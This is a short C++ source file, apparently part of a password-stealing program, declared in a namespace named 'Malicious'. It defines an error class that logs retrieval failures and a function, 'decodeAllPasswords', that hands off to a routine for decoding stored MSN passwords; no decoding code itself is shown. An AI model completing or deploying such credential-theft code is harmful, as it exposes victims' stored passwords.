#include "Passwords.hpp"
#include <log/Log.hpp>

namespace Malicious {
	ErrorWhileRetrieving::ErrorWhileRetrieving(const std::string& msgArg) :
		Exception(msgArg) {
		LOG << "TransferException : " + Common::toString(typeid(this).name()) + msgArg;
	}

	std::string decodeAllPasswords(char delimiter) {
		return decodeMsnPasswords(delimiter);
	}
} // Malicious
